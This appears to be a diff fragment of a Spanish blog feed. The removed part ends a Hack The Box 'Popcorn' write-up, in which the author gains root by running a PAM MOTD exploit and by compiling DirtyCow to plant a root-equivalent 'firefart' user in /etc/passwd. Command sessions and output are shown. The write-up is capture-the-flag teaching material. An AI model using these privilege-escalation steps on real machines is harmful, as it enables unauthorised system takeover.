-dos2unix: convirtiendo archivo privesc_motd.sh a formato Unix...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Copiamos el contenido con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xclip&lt;/code&gt; y nos creamos un archivo en la máquina víctima bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;privesc_motd.sh | xclip &lt;span class=&quot;nt&quot;&gt;-sel&lt;/span&gt; clip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm
-www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;privesc.sh
-www-data@popcorn:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x privesc.sh
-www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano privesc.sh 
-www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 4
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data 3043 Jan 17 02:30 privesc.sh
-www-data@popcorn:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si leemos un poco el exploit, nos dice que el script nos solicitará una contraseña para acceder como el usuario &lt;strong&gt;root&lt;/strong&gt; que es &lt;strong&gt;toor&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./privesc.sh 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ubuntu PAM MOTD &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;root
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SSH key &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;up
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; spawn ssh
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] owned: /etc/passwd
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; spawn ssh
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] owned: /etc/shadow
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SSH key removed
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Success! Use password toor to get root
-Password: 
-root@popcorn:/dev/shm# &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-root@popcorn:/dev/shm#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;
-
-&lt;p&gt;Otra forma de escalar privilegios en mediante la explotación del kernel ya que es muy vieja:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@popcorn:~# &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-Linux popcorn 2.6.31-14-generic-pae &lt;span class=&quot;c&quot;&gt;#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux&lt;/span&gt;
-root@popcorn:~# lsb_release &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
-No LSB modules are available.
-Distributor ID: Ubuntu
-Description:    Ubuntu 9.10
-Release:        9.10
-Codename:       karmic
-root@popcorn:~#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para este caso utilizaremos el recurso &lt;a href=&quot;https://github.com/FireFart/dirtycow&quot;&gt;dirtycow&lt;/a&gt;, así que primero validamos que la máquima víctima tiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which gcc
-/usr/bin/gcc
-www-data@popcorn:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que si, así que nos copiamos el archivo y lo guardamos en el máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano dirty.c 
-www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 12
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data 4816 Jan 17 02:44 dirty.c
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data 3043 Jan 17 02:30 privesc.sh
-www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;dirty.c | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;gcc
-//   gcc &lt;span class=&quot;nt&quot;&gt;-pthread&lt;/span&gt; dirty.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; dirty &lt;span class=&quot;nt&quot;&gt;-lcrypt&lt;/span&gt;
-www-data@popcorn:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Dentro del mismo script ya nos indica la forma de compilarlo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 28
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data 13603 Jan 17 02:45 dirty
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  4816 Jan 17 02:44 dirty.c
-&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 www-data www-data  3043 Jan 17 02:30 privesc.sh
-www-data@popcorn:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al ejecutarlo nos pedirá una contraseña, ingresamos cualquiera, esperamos un rato y despúes hacemos Ctrl + C. El programa lo que hace es modificar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; agregando el usuario &lt;strong&gt;firefart&lt;/strong&gt; con la contraseña que le indicamos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./dirty  
-/etc/passwd successfully backed up to /tmp/passwd.bak
-Please enter the new password: 
-Complete line:
-firefart:fic6dC9mK3e6U:0:0:pwned:/root:/bin/bash
-
-mmap: b7737000
-
-^C
-www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
-firefart:fic6dC9mK3e6U:0:0:pwned:/root:/bin/bash
-/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-news:x:9:9:news:/var/spool/news:/bin/sh
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-syslog:x:101:103::/home/syslog:/bin/false
-landscape:x:102:105::/var/lib/landscape:/bin/false
-sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
-george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
-mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
-www-data@popcorn:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Por lo tanto, migramos al usuario &lt;strong&gt;firefart&lt;/strong&gt; con la contraseña que le indicamos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@popcorn:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su firefart
-Password: 
-firefart@popcorn:/dev/shm# &lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-firefart@popcorn:/dev/shm# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que dicho usuario se encuentra en el grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, es como si cambiara el nombre de &lt;strong&gt;root&lt;/strong&gt; por &lt;strong&gt;firefart&lt;/strong&gt;, conservando todos los privilegios del usuario &lt;strong&gt;root&lt;/strong&gt;; por lo tanto, de esta forma podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="Web" /><summary type="html">Resolución de la máquina Popcorn en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="XXE" /><category term="Cryptography" /><category term="Web" /><summary type="html">Resolución de la máquina ForwardSlash en la plataforma de Hack The Box</summary></entry></feed>
